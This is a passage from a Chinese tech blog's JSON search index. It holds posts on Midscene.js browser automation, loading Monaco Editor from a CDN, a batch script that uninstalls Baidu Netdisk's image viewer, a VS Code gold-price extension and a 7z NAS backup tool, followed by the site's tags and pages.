turndownService.turndown(html); document.getElementById(\"md-content\").value = markdown; }, }; const editor = createEditor({ selector: \"#editor-container\", html: \"\", config: editorConfig, mode: \"simple\", }); const toolbar = createToolbar({ editor, selector: \"#toolbar-container\", config: {}, mode: \"simple\", });","link":"/2025/html-to-md/"},{"title":"Midscene.js：AI驱动的自动化测试工具","text":"字节有一个很实用但不怎么火的项目，叫 Midscene.js，Chrome 商店上的安装数仅有 1 万，它是一个由多模态模型驱动的前端自动化测试插件。 Midscene.js 一共就三大 API：Action、Query、Assert Action 交互描述步骤并执行交互。例如，在 GitHub 上交互：查找 GitHub 上的 Twikoo 项目，点进详情页，点个 Star—— Query 提取从 UI 中“理解”并提取数据，返回值是 JSON 格式，想要什么数据结构，它都可以给你。例如，在面试题宝典网站上提取：string[]，所有面试题目—— Assert 断言判断是否符合指定条件。例如，在智能家庭页面断言：电脑是关着的—— 大模型支持情况项目最初仅支持 GPT-4o 模型，跑一行用例的成本在 ¥0.1 左右，还挺贵的，后来支持了 Qwen-2.5-VL 和 UI-TARS，成本就大幅降低了。以下就以千问模型为例，带领大家上手这个神奇的插件。 安装可以直接从 Chrome 商店安装：https://chromewebstore.google.com/detail/midscene/gbldofcpkknbggpkmbdaefngejllnief 配置从浏览器右上角的插件菜单中打开 Midscene.js 的侧边栏，会提示 No config，点击按钮会弹出 Env Config 的设置框，在里面配置以下变量 1234OPENAI_BASE_URL=&quot;https://dashscope.aliyuncs.com/compatible-mode/v1&quot;OPENAI_API_KEY=&quot;sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;MIDSCENE_MODEL_NAME=&quot;qwen-vl-max-latest&quot;MIDSCENE_USE_QWEN_VL=1 其中的 OPENAI_API_KEY 需要你自己申请，申请的地址是：https://bailian.console.aliyun.com/?apiKey=1#/api-key 以上链接不包含推广，如果你是首次开通阿里云百炼，新用户是有免费额度的，请注意额度的有效期，避免浪费~ 测试接下来用自然语言随便写一条指令，点击 Run 按钮，见证 AI 开始接管你的浏览器…… 代码集成接下来我们尝试编写爬虫，组合这三大 API，完成复杂的自动化任务。 建一个新的 Node.js 项目，安装所需的依赖—— 1pnpm install @midscene/web tsx --save-dev 编写脚本 main.ts，执行你想要进行的操作，例如，打开必应，输入 iMaeGoo 点击搜索，并输出搜索结果—— main.ts123456789101112131415161718192021222324252627import { AgentOverChromeBridge } from &quot;@midscene/web/bridge-mode&quot;;function sleep(ms: number) { return new Promise((r) =&gt; setTimeout(r, ms));}async function main() { process.env.OPENAI_BASE_URL = &quot;https://dashscope.aliyuncs.com/compatible-mode/v1&quot;; process.env.OPENAI_API_KEY = &quot;sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;; process.env.MIDSCENE_MODEL_NAME = &quot;qwen-vl-max-latest&quot;; process.env.MIDSCENE_USE_QWEN_VL = 1; const agent = new AgentOverChromeBridge(); // 这个方法将连接到你的桌面 Chrome 的新标签页 // 记得启动你的 Chrome 插件，并点击 'allow connection' 按钮。否则你会得到一个 timeout 错误 await agent.connectNewTabWithUrl(&quot;https://www.bing.com&quot;); // 这些方法与普通 Midscene agent 相同 await agent.ai(&quot;输入 iMaeGoo 点击搜索&quot;); const result = await agent.aiQuery( &quot;{title: string, url: string}[], 搜索结果&quot; ); console.log(&quot;搜索结果&quot;, result); await sleep(3000); await agent.destroy();}main(); 启动你的 Chrome 插件，点击 Bridge Mode，再点击 ‘Allow connection’ 按钮—— 随后运行脚本—— 1pnpx tsx main.ts 可以看到脚本成功打开必应搜索 iMaeGoo 并打印出了搜索结果——","link":"/2025/midscene-js/"},{"title":"CDN 方式引入 Monaco Editor","text":"在前端工程中可以用 @monaco-editor/loader 来引入 Monaco，但有时候我们的前端项目不依赖 Webpack、Vite 等打包工具，如何在普通网页中用纯 CDN 的方式引入 Monaco Editor？ 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;Monaco Editor&lt;/title&gt; &lt;style&gt; body { margin: 0; padding: 0; } #editor { width: 100vw; height: 100vh; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;editor&quot;&gt;&lt;/div&gt; &lt;script src=&quot;https://registry.npmmirror.com/monaco-editor/0.52.2/files/min/vs/loader.js&quot;&gt;&lt;/script&gt; &lt;script&gt; require.config({ paths: { vs: &quot;https://registry.npmmirror.com/monaco-editor/0.52.2/files/min/vs&quot;, }, }); window.MonacoEnvironment = { getWorkerUrl: function (workerId, label) { return `data:text/javascript;charset=utf-8,${encodeURIComponent( 'self.MonacoEnvironment={baseUrl:&quot;https://registry.npmmirror.com/monaco-editor/0.52.2/files/min/&quot;};' + 'importScripts(&quot;https://registry.npmmirror.com/monaco-editor/0.52.2/files/min/vs/base/worker/workerMain.js&quot;);' )}`; }, }; require([&quot;vs/editor/editor.main&quot;], function () { const editorElement = document.getElementById(&quot;editor&quot;); const editor = monaco.editor.create(editorElement, { value: &quot;function main() {\\n console.log('Hello, iMaeGoo!');\\n}\\n\\nmain();\\n&quot;, language: &quot;javascript&quot;, }); window.addEventListener(&quot;resize&quot;, () =&gt; editor.layout({ width: editorElement.offsetWidth, height: editorElement.offsetHeight, }) ); }); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 效果","link":"/2025/monaco-editor-cdn/"},{"title":"卸载百度网盘智能看图","text":"复制代码，粘贴到记事本，保存为 bat 文件，右键以管理员身份运行。 123456789101112131415161718192021222324252627282930313233343536373839@echo offecho 百度网盘智能看图卸载工具echo 请以管理员身份运行此脚本！echo.echo 正在删除注册表项...:: 删除HKEY_CLASSES_ROOT\\BaiduNetdiskImageViewerAssociationstaskkill /f /im BaiduNetdisk.exe &gt;nul 2&gt;nulreg delete &quot;HKEY_CLASSES_ROOT\\BaiduNetdiskImageViewerAssociations&quot; /f &gt;nul 2&gt;nul:: 删除HKEY_CURRENT_USER\\Software\\Baidu\\BaiduNetdiskImageViewerreg delete &quot;HKEY_CURRENT_USER\\Software\\Baidu\\BaiduNetdiskImageViewer&quot; /f &gt;nul 2&gt;nul:: 删除HKEY_CURRENT_USER\\Software\\RegisteredApplications\\BaiduNetdiskImageViewerreg delete &quot;HKEY_CURRENT_USER\\Software\\RegisteredApplications&quot; /v &quot;BaiduNetdiskImageViewer&quot; /f &gt;nul 2&gt;nulecho.echo 正在删除文件夹...:: 安装位置不确定，但开始菜单中一定有快捷方式，通过快捷方式读取百度网盘的安装位置for /f &quot;usebackq delims=&quot; %%I in (` powershell -NoLogo -NoProfile -Command ^ &quot;(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\百度网盘\\百度网盘.lnk').TargetPath&quot;`) do ( set &quot;installDir=%%~dpI&quot;)set &quot;installDir=%installDir:~0,-1%&quot;echo 百度网盘安装位置：%installDir%:: 查找并删除百度网盘根目录中的ImageViewer文件夹for /d %%i in (&quot;%installDir%&quot;, &quot;C:\\Program Files\\Baidu\\BaiduNetdisk&quot;) do ( if exist &quot;%%i\\module\\ImageViewer&quot; ( rd /s /q &quot;%%i\\module\\ImageViewer&quot; ))echo.echo 百度网盘智能看图卸载完成！pause","link":"/2025/uninstall-netdisk-image-viewer/"},{"title":"Android 强制锁定屏幕旋转方向","text":"在使用我的一加平板时，一直被一个问题困扰，由于我的桌面电源在左手边，平板横着放在桌上时，如果需要充电，就需要将 Type-C 接口对准左侧，这就需要先解除旋转锁定，立起平板，待屏幕旋转后，打开旋转锁定，再放平。使其锁定在充电口朝左的横屏状态（技术上称为 SCREEN_ORIENTATION_REVERSE_LANDSCAPE，屏幕方向反横向）。 以前用 iPad Pro 时，我也是一直都这么干的，这倒也没啥，但更麻烦的问题来了。有些 APP 由于代码实现问题，会强制屏幕旋转至某个方向，例如在平板打开美团时，会自动切换到竖屏，打开苍雾世界时，会自动切换到充电口朝右的横屏，退出应用时又会自动切回来。于是当我需要以上场景使用这些 APP 时，必须拖着充电线把平板转来转去，不够大的桌面，不够长的充电线，加上 13 寸 1 斤重的平板，让这一切显得格外艰难。 无法忍受的我便去寻找解决方案，有没有什么模块，能让旋转锁定真正发挥『锁定』的作用，让屏幕不受 APP 影响地保持在一个方向？ 找到了 Orientation Lock，这个只有 65 个 star 的软件可能鲜为人知，但作者 tuyafeng 的另一个软件『Via 浏览器』大家应该都听过。Orientation Lock 的体积只有 60 KB，非常符合该作者的风格，只需要悬浮窗权限，不需要 adb 不需要 root 也不需要安装模块。打开 APP，选择『反转横屏』，然后授予悬浮窗权限，好了，现在各个 APP 都可以在反横屏状态下使用了，解决了我的大麻烦！ 附上下载地址：https://github.com/tuyafeng/OrientationLock/releases/download/1.0.0/OrientationLock_v1.0.apk","link":"/2025/orientation-lock/"},{"title":"仅需两个文件，实现在 VS Code 状态栏监控黄金价格","text":"最近金价波动剧烈，要是能一边写代码，一边实时监控金价变动，就不会错过高低点了！ 在 C:\\Users\\你的用户名\\.vscode\\extensions 新建文件夹 gold-monitor，在文件夹中创建两个文件 package.json 和 extension.js。 package.json1234567891011121314151617181920212223242526{ &quot;name&quot;: &quot;jd-gold-price-monitor&quot;, &quot;displayName&quot;: &quot;JD Gold Price Monitor&quot;, &quot;description&quot;: &quot;Monitor gold price from JD&quot;, &quot;version&quot;: &quot;0.0.3&quot;, &quot;author&quot;: &quot;iMaeGoo&quot;, &quot;publisher&quot;: &quot;iMaeGoo&quot;, &quot;engines&quot;: { &quot;vscode&quot;: &quot;^1.85.0&quot; }, &quot;categories&quot;: [ &quot;Other&quot; ], &quot;activationEvents&quot;: [ &quot;onStartupFinished&quot; ], &quot;main&quot;: &quot;./extension.js&quot;, &quot;contributes&quot;: { &quot;commands&quot;: [ { &quot;command&quot;: &quot;gold-price-monitor.start&quot;, &quot;title&quot;: &quot;Start Gold Price Monitor&quot; } ] }} extension.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374const vscode = require(&quot;vscode&quot;);let statusBarItem;let intervalId;function activate(context) { // 创建状态栏项 statusBarItem = vscode.window.createStatusBarItem( // 在状态栏左半边显示 vscode.StatusBarAlignment.Left, // 数字越大，越靠左 -999 ); context.subscriptions.push(statusBarItem); // 注册命令 let disposable = vscode.commands.registerCommand( &quot;gold-price-monitor.start&quot;, () =&gt; { startMonitoring(); } ); context.subscriptions.push(disposable); // 激活时自动开始监控 startMonitoring();}async function updateGoldPrice() { try { const price = await getPrice(); statusBarItem.text = price; statusBarItem.show(); } catch (error) { console.error(&quot;获取价格失败&quot;, error); statusBarItem.text = error.message; statusBarItem.show(); }}async function getPrice() { // 获取京东金融民生银行积存金价 const response = await fetch( &quot;https://api.jdjygold.com/gw/generic/hj/h5/m/latestPrice?reqData={}&quot; ); const data = await response.json(); const price = data.resultData.datas.price; return price;}function startMonitoring() { // 清除现有的定时器 if (intervalId) { clearInterval(intervalId); } // 立即更新一次 updateGoldPrice(); // 设置定时器，每隔 6666 毫秒更新一次 intervalId = setInterval(updateGoldPrice, 6666);}function deactivate() { if (intervalId) { clearInterval(intervalId); }}module.exports = { activate, deactivate,}; 重新启动 VS Code（Ctrl + Shift + P，输入 reload window，回车）即可看到效果。 如果你想监测其他品牌金价，可以修改 getPrice 方法，具体实现如下。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576async function zheshang() { // 获取京东金融浙商银行积存金价 const response = await fetch( &quot;https://api.jdjygold.com/gw2/generic/jrm/h5/m/stdLatestPrice?productSku=1961543816&quot; ); const data = await response.json(); const price = data.resultData.datas.price; return price;}async function zhoushengsheng() { // 获取周生生首饰金价 try { const res = await fetch(&quot;https://cn.chowsangsang.com/gold-info&quot;); const data = await res.text(); const gold_data_match = data.match(/:gold_data='(.*)'/); const gold_data = gold_data_match ? JSON.parse(decode(gold_data_match[1])) : []; const price = gold_data.find( (i: any) =&gt; i.description === &quot;黄金金价&quot; ).price; return price; } catch (e) { console.error(&quot;zhoushengsheng&quot;, e); }}async function laofengxiang() { // 获取老凤祥首饰金价 const res = await fetch(&quot;http://lfx1848.com&quot;); const data = await res.text(); const price_match = data.match(/&lt;span id=&quot;labContent&quot;&gt;(.*)&lt;\\/span&gt;/); const price = price_match ? price_match[1] : &quot;&quot;; return price;}async function zhouliufu() { // 获取周六福首饰金价 const res = await fetch(&quot;https://price.zlf.cn/index_35.aspx&quot;); const data = await res.text(); const price_match = data.match(/&lt;span class=&quot;fr&quot;&gt;(.*)&lt;\\/span&gt;/); const price = price_match ? price_match[1] : &quot;&quot;; return price;}async function liufuzhubao() { // 获取六福珠宝首饰金价 const res = await fetch(&quot;https://www.lukfookeshop.com.cn&quot;); const data = await res.text(); const price_match = data.match(/&gt;：(.*?)元\\/克/); const price = price_match ? price_match[1] : &quot;&quot;; return price;}async function zhoudafu() { // 获取周大福首饰金价 const res = await fetch( `https://api2.ctfmall.com/gateway//ctfmall-common2-server/common/ctfTodayGoldPrice?timestamp=${Date.now()}` ); const data: any = await res.json(); const price = data.data.todayPriceHK; return price;}async function laomiao() { // 获取老庙首饰金价 const res = await fetch( &quot;https://vip.laomiao.com.cn/index.php/m/home-gold_price.html&quot; ); const data: any = await res.json(); const price = data.data.price_list.find( (i: any) =&gt; i.name === &quot;足金饰品&quot; ).price; return parseInt(price);}","link":"/2025/vscode-ext-gold-monitor/"},{"title":"基于 7z 的 NAS 到网盘备份解决方案，支持增量、分卷、加密、压缩","text":"故事背景曾经，我组建了一个极空间的 NAS。往里面塞了两块 12T 的硬盘，将 20 年来的照片，音乐，电影，游戏、代码、文档都导了进去。虽然两块硬盘互为备份的机制一定程度解决了硬盘可能出现的寿命问题，但心里总是没底，毕竟两块硬盘在物理层面是放在一起的，万一出个什么断电或者天灾什么的，两块硬盘一起坏了怎么办？将数据备份到网盘是一个不错的选择。但问题马上出现，NAS 上的文件至少有几十万到上百万，有些文件的目录层级还藏的很深，还有一些超过 10G 的巨型文件。绝大多数网盘都无法处理这种海量文件和巨型文件的情况，另外，照片库是一个非常隐私的东西，我也不想直接把照片传到网盘上，被大数据精准营销，有些文件，比如游戏和电影资源，还可能会直接被网盘封杀，另外，每隔一段时间，我都需要向网盘上传新增的文件，很难整理出哪些文件是新的，将以上问题总结起来就是—— 要支持海量小文件的备份 要支持单个过大的文件的备份 要支持先加密再上传到网盘 要支持增量备份（你也不想每次备份完都上传几个 T 的文件吧） 首先想到的方案是直接通过 7-Zip 分卷加密压缩，但是这样意味着当我想从网盘中取出某一个文件时，必须要把整整 2~3T 的文件全部下下来。后来我了解到了 Duplicati，这也是很多极空间用户的选择。他可以直接通过 Docker 的方式部署在极空间，实现文件的加密备份，你可以手动设置每个备份文件的最大大小，更方便的是需要某个文件时，只需要从网盘下载相关的分卷即可。但使用以后，我又发现以下两个问题—— Duplicati 生成的备份文件，必须由 Duplicati 读取，即使它产生的 AES 文件可以通过 AES Crypt 命令行解密，解密后的文件结构也难以恢复，我就是不想绑定这个工具！ 备份文件名是完全随机的 hash 值，难以快速找到某个文件在哪个分卷中。有时出门在外，家里没网，想从网盘找个文件，完全没辙！ 对此，我想出了以下备份方案—— 总体思想：保持目录结构的同时，大文件分卷，小文件合并，使用 7-Zip 进行加密压缩 递归 NAS 目录，如果目录小于指定的分卷大小，直接整目录压缩为一个文件 如果目录大于指定的分卷大小，没有子目录，就将整目录分卷压缩 如果目录大于指定的分卷大小，有子目录，对子目录执行以上判断，对子文件执行分卷压缩 支持增量备份，每次备份生成文件列表，文件列表中记录有文件的大小和修改时间，根据这两个属性判断文件是否有改动，后续备份只需要将新的备份目录上传到网盘即可，无需重新上传完整的备份 这样当我在异地需要从网盘取回某个指定文件时，只需要到对应的目录，下载对应的压缩文件，用 7-Zip 解压，输入密码即可，只需要一个解压软件，其他任何工具都不需要装，是不是非常方便！ 最近出了一个以 Spec Coding（规约编程）为卖点的 AI IDE 名叫 Kiro，正好拿这个项目试试水！你可以查看 requirements.md、design.md、tasks.md 来看看 Kiro 是如何从 0 完成整个项目的，真的很强！ 项目已开源：https://github.com/imaegoo/zbak 如果你认为这个备份方法适合你，欢迎下载使用！工具现支持命令行调用，也支持 Docker 调用。我是直接在极空间上的 Docker 跑的。 工作原理备份流程 增量检测 - 扫描源目录，比对文件索引，识别新增、修改和删除的文件 智能压缩 - 根据目录大小和结构选择压缩策略： 小目录（&lt; 分卷大小）：单文件压缩 大目录无子目录：分卷压缩 大目录有子目录：递归处理 并发执行 - 使用工作池并发处理多个压缩任务 索引更新 - 更新文件索引，记录备份信息 时间戳管理 - 将备份文件存储在时间戳目录中 恢复流程 发现备份 - 扫描时间戳目录，识别所有压缩文件 按序恢复 - 按时间顺序依次解压备份文件 覆盖更新 - 新版本文件覆盖旧版本 删除处理 - 删除索引中标记为已删除的文件 目录结构备份出来的目录就长这样，保持源目录结构的同时，拆分了大文件，合并了小文件，全部实现加密压缩，每次备份都生成一个时间戳命名的目录。 1234567891011121314target_dir/├── index.yaml # 文件索引├── backup-2024-01-15-10-30-00.log # 备份日志├── 2024-01-15-10-30-00/ # 时间戳目录│ ├── dir1.7z.001 # 小目录压缩│ ├── dir2/│ │ ├── files.7z.001 # 目录中的文件│ │ ├── files.7z.002│ │ └── subdir1.7z.001 # 子目录压缩│ └── dir3/│ ├── subdir1.7z.001│ └── subdir2.7z.001└── 2024-01-16-14-20-00/ # 另一个时间戳目录 └── ... 配置说明写个 config.yaml 跟程序放一起就行。 配置项 类型 必需 说明 source_dir string 是 需要备份的源目录路径 target_dir string 是 存储备份文件的目标目录路径 volume_size int64 是 分卷大小（字节），建议4GB（4294967296） password string 是 加密密码，用于7zip AES-256加密 concurrency int 是 并发压缩任务数，建议设置为CPU核心数 compression_level int 否 压缩级别 (0-9)，默认为1（极速）。0=存储，1=极速，5=正常，9=最大压缩 性能特点 内存稳定 - 处理大量小文件时保持稳定的内存使用 高效索引 - 使用哈希表实现O(1)查找性能 并发优化 - 合理利用CPU资源，支持多任务并发处理 缓冲写入 - 日志记录使用缓冲写入，提高I/O性能","link":"/2026/nas-backup/"}],"tags":[{"name":"android","slug":"android","link":"/tags/android/"},{"name":"js","slug":"js","link":"/tags/js/"},{"name":"chartjs","slug":"chartjs","link":"/tags/chartjs/"},{"name":"css","slug":"css","link":"/tags/css/"},{"name":"shadowdefender","slug":"shadowdefender","link":"/tags/shadowdefender/"},{"name":"restapi","slug":"restapi","link":"/tags/restapi/"},{"name":"vb","slug":"vb","link":"/tags/vb/"},{"name":"angularjs","slug":"angularjs","link":"/tags/angularjs/"},{"name":"vagrant","slug":"vagrant","link":"/tags/vagrant/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"chrome","slug":"chrome","link":"/tags/chrome/"},{"name":"cdn","slug":"cdn","link":"/tags/cdn/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"life","slug":"life","link":"/tags/life/"},{"name":"devops","slug":"devops","link":"/tags/devops/"},{"name":"nodejs","slug":"nodejs","link":"/tags/nodejs/"},{"name":"azure","slug":"azure","link":"/tags/azure/"},{"name":"icarus","slug":"icarus","link":"/tags/icarus/"},{"name":"mysql","slug":"mysql","link":"/tags/mysql/"},{"name":"amazon","slug":"amazon","link":"/tags/amazon/"},{"name":"material","slug":"material","link":"/tags/material/"},{"name":"vue","slug":"vue","link":"/tags/vue/"},{"name":"csharp","slug":"csharp","link":"/tags/csharp/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"tool","slug":"tool","link":"/tags/tool/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"onedrive","slug":"onedrive","link":"/tags/onedrive/"},{"name":"oneindex","slug":"oneindex","link":"/tags/oneindex/"},{"name":"html","slug":"html","link":"/tags/html/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"twikoo","slug":"twikoo","link":"/tags/twikoo/"},{"name":"小程序","slug":"小程序","link":"/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"ubuntu","slug":"ubuntu","link":"/tags/ubuntu/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"serverless","slug":"serverless","link":"/tags/serverless/"},{"name":"vite","slug":"vite","link":"/tags/vite/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"webpack","slug":"webpack","link":"/tags/webpack/"},{"name":"diary","slug":"diary","link":"/tags/diary/"},{"name":"github","slug":"github","link":"/tags/github/"},{"name":"edge","slug":"edge","link":"/tags/edge/"},{"name":"xlsx","slug":"xlsx","link":"/tags/xlsx/"},{"name":"hardware","slug":"hardware","link":"/tags/hardware/"},{"name":"electron","slug":"electron","link":"/tags/electron/"},{"name":"app","slug":"app","link":"/tags/app/"},{"name":"nas","slug":"nas","link":"/tags/nas/"}],"categories":[{"name":"Diary","slug":"diary","link":"/categories/diary/"},{"name":"Tech","slug":"tech","link":"/categories/tech/"},{"name":"Windows","slug":"tech/windows","link":"/categories/tech/windows/"},{"name":"Android","slug":"tech/android","link":"/categories/tech/android/"},{"name":"BackEnd","slug":"tech/backend","link":"/categories/tech/backend/"},{"name":"FrontEnd","slug":"tech/frontend","link":"/categories/tech/frontend/"},{"name":"Tool","slug":"tool","link":"/categories/tool/"},{"name":"Serverless","slug":"tech/serverless","link":"/categories/tech/serverless/"},{"name":"Linux","slug":"tech/linux","link":"/categories/tech/linux/"},{"name":"Hardware","slug":"tech/hardware","link":"/categories/tech/hardware/"},{"name":"Harmony","slug":"tech/harmony","link":"/categories/tech/harmony/"},{"name":"macOS","slug":"tech/macos","link":"/categories/tech/macos/"}],"pages":[{"title":"404 - PAGE NOT FOUND","text":"文章不见了！该文章或分类大概已被删除。返回上一页The article or category has been deleted, probably? Go back 如有疑问，可在下方留言反馈。","link":"/404/"},{"title":"Cookie Policy","text":"本网站可能使用 Cookies。此页面描述了我们如何以及为什么使用 Cookies。 我们如何使用 Cookies我们使用 Cookies 来统计访客数据，以及匿名地标识评论人。如果您不确定是否需要它们，建议您保留所有 Cookies。 禁用 Cookies您可以通过调整浏览器上的设置来阻止 Cookies 的设置（有关操作方法，请参阅浏览器帮助）。请注意，禁用 Cookies 会影响此网站以及您访问的许多其他网站的功能。因此，建议您不要禁用 Cookies。 评论相关的 Cookies我们将使用 Cookies 来 匿名地 标识您，以便在您返回我们的网站时识别您的身份，您的匿名身份将用于支持评论系统和阅读量统计。 第三方 Cookies我们使用一些第三方 Cookies，不蒜子 和 Google Analytics 来统计访客数据。 我们知道有关您的哪些信息？我们不要求您提供个人信息以访问我们的网站。我们可能会自动收到您的 IP 地址和用户代理（User Agent）。如果您发表评论，我们将收到您填写的昵称，邮箱和网址。 若您对本政策或我们的隐私实践有任何疑问或意见，请通过点击网站左侧的邮箱图标联系我们。","link":"/cookies/"},{"title":"About Me","text":".heimu { color: #000; background-color: #000; } .heimu:hover { color: #fff; } iMaeGoo 出自独立游戏 World of Goo 里小粘球的叫声，读作 /ɪ’mæɡu/ 不是爱妹狗啊 95后开发一枚，工作在郑州，爱好：前端、数码、动漫、手游、旅游 追的动漫：明日方舟：焰烬曙明玩的手游：崩坏3（B服 牧耀佑七 ID:111478867）、明日方舟（官服 牧耀佑七#4728）、明日方舟：终末地（官服 牧耀佑七 ID:1933609216）、原神（天空岛 牧耀佑七 ID:100405870）、崩坏：星穹铁道（星穹列车 牧耀佑七 ID:100723557）、绝区零（新艾利都 牧耀佑七 ID:10050959）、鸣潮（官服 牧耀佑七 ID:101239816）数码设备：机械革命无界 15X、联想拯救者 Y700 四代、iPhone 12 mini、一加 Ace 5 竞速版、小米 17 Pro Max、Amazfit Neo、Nintendo Switch 博客主要写一些前端的技术文章，以及记录自己还没能解决的坑，但因为自己表达能力很差，更多只是写给自己看的，如果发现看不懂应该很正常 😰，不懂之处和可以改进的地方欢迎留言 🙏 本站文章如无特别声明，均为原创，采用 知识共享署名 4.0 国际许可协议 进行许可，转载请注明来源。 本站采用了 Hexo 静态博客框架，主题为 Icarus 个人修改版，本人写作能力很差。修改的主题不提供文档，有使用上的疑问可在 Issue 中提问，也可在博客中留言。 本站使用 不蒜子 和 Google Analytics 统计访客数据，包括但不限于您的 IP 地址、地理位置、访问页面等，继续浏览代表您接受我们收集此类信息。如您不接受，可选择禁用本站 Javascript 权限（例：选择地址栏左边的小锁 - 站点权限 - Javascript - 阻止），这不会影响您正常浏览站内博客文章，但会影响搜索、评论等功能。 感谢以下开源项目贡献者（整理得比较晚，无法全部列出，如有遗漏欢迎留言）： Name Author Description Hexo Hexo contributors Blog framework Icarus ppoffice A simple, delicate, and modern theme for Hexo Live2D fghrsh 看板娘插件 hexo-deployer-cos sdlzhd &amp; caikeal Hexo 腾讯云对象存储上传插件 pinyin-match xmflswood 拼音检索模块 Twikoo 我自己~ 评论系统 以及免费提供静态存储和 CDN 的：腾讯云, Netlify, GitHub Pages 以及免费提供自动化部署的：阿里云云效 以及免费提供 API 支持的：不蒜子 访问量计数 星极头像画师：泉酱，链接博客背景图画师：ふたばのたいこ，链接：☀️🧟🐾🐈、💰🌱🛎 感谢以下打赏者： 日期 名字 金额 备注 2021-06-18 M*y 1.00 2021-09-27 LillianWho 15.00 2021-11-05 (*) 5.00 2022-01-09 *君 10.00 2022-04-27 **溪 3.00 2022-05-20 G*x 30.00 twikoo 捐赠 2022-08-03 *帆 10.00 GC-ZF十分感谢twikoo 2022-12-27 *黎 20.00 哈喽，你的虹墨空间站很棒啊！先单纯赞助下。另外想问下框架的源码方便提供吗？本人无前段经验，只想要个框架往里面添加笔记文档 2023-05-14 *鹏 5.00 感谢twikoo作者 2023-06-01 R*n 1.00 2023-10-27 *子 1.00 用到了你的AES密钥生成器 2024-02-23 Starknet 1681.59 领取开源项目贡献者空投 2024-07-01 **捷 5.00 压缩字体博客很棒，感谢 2024-10-24 **晨 6.66 2024-10-27 L*y 5.00 考前救命惹！感恩大佬 2025-06-02 **超 0.01 2025-06-11 *富 0.01 2025-07-08 *P 20.00 大佬，喝杯茶，智能表可以增加对图片增删改查吗？ 2025-11-13 *雨 1.00","link":"/about/"},{"title":"留言板","text":"留下足迹吧！","link":"/messages/"},{"title":"友情链接","text":".article .content { overflow-x: hidden; } .friends { display: flex; align-items: stretch; justify-content: space-between; flex-wrap: wrap; margin: -6px; } .friends .friend { margin: 6px; min-width: 240px; flex: 1; display: flex; align-items: center; justify-content: center; border-radius: 10px; border: 1px solid rgba(200, 200, 200, 0.2); background-color: rgba(200, 200, 200, 0.1); position: relative; } .friends .friend.friend-empty { border: none; background: none; } .friends .friend .friend-avatar { flex-shrink: 0; margin: 8px; width: 60px; height: 60px; line-height: 60px; border-radius: 30px; background-color: rgba(200, 200, 200, 0.2); background-size: cover; background-position: center; font-size: 24px; text-align: center; } .friends .friend .friend-detail { flex: 1; width: 0; display: flex; flex-direction: column; margin: 8px 8px 8px 0; } .friends .friend .friend-pop { position: absolute; width: 100%; left: 0; bottom: 0; } .friends .friend .friend-pop div { position: absolute; width: 100%; top: 8px; left: 0; padding: 8px; color: rgba(255, 255, 255, 0.9); border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); background-color: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); z-index: 10; user-select: none; pointer-events: none; transition: opacity 0.5s; opacity: 0; } .friends .friend:hover .friend-pop div { opacity: 1; } 本站已于 2024 年 6 月清理友情链接，符合以下条件之一的友链已被删除： 超过半年无法正常访问 文章数小于 20 且近 2 年未发布任何文章 M maemoの風船が！&nbsp; www.maemo.cc 米米的博客&nbsp; zhangshuqiao.org 签名: 米米的博客！！ 辣椒の酱 removeif.github.io 签名: 后端开发，技术分享 Sakitami的集装箱&nbsp; blog.skihome.xyz 签名: 我已经无敌了！ 宇宙湾&nbsp; yuzhouwan.com 签名: 主要是大数据和人工智能的原创文章。 Ray's Blog blog.mk1.io 签名: Never say never. YunShu'Blog&nbsp; blog.yunshu.site 签名: 爱好记录,喜欢分享~ Oskyla 晴空阁&nbsp; oskyla.com 签名: 晴朗的天空。 皮皮凛の小窝&nbsp; owomoe.net 签名: 永远相信美好的事情即将发生~ ADD-SP's Blog www.addesp.com 签名: Hello World！ Heo&nbsp; blog.zhheo.com 签名: 爱折腾的设计师 Fungit fungit.org 签名: 木秀于林 风必摧之 I Am I&nbsp; 5ime.cn 签名: 永远相信美好的事情即将发生 Android&nbsp; android99.com 签名: 矩阵 小嘉的部落格&nbsp; blog.imzjw.cn 签名: 好记性不如烂笔头 guole's Blog&nbsp; guole.fun 签名: 保持理智，相信明天 飞鸟 lzxjack.top 签名: 一只平凡的鸟罢了 cywhat's blog&nbsp; cywhat.cn 签名: 一位摸爬滚打的测开Dog. pai233の小窝&nbsp; blog.pai233.top 签名: Write Down My Life. ImCaO's Blog&nbsp; www.imcao.cn 签名: 花有重开日，人无再少年。 Tianli&nbsp; blog.tianli0.top 签名: 自知之明是最可贵的知识！ wallleap myblog.wallleap.cn 签名: Luwang's Blog 无妄当自持&nbsp; www.insidentally.com 签名: 学习、实践、分享 海拥 haiyong.site 签名: 一个乐于分享技术与快乐的博主 XKの博客&nbsp; blog.xukaiyyds.cn 签名: 一个干净整洁的个人博客 CoulsonZero docs.coulsonzero.top BeaCox&nbsp; blog.beacox.space 签名: On the way to be a hacker Felix_Chenの基地&nbsp; blog.snowflake.zone 签名: Aim for the moon, even if you miss, you would shoot the star. 望月阁&nbsp; www.kaitaku.xyz 签名: 一个萌新的学习笔记 Leonus's blog&nbsp; blog.leonus.cn 签名: 进一寸有进一寸的欢喜。 CasecoRI 的小站 blog.5252025.xyz 签名: 高智熵博主 Bai's Blog&nbsp; blog.baiyz.top 签名: 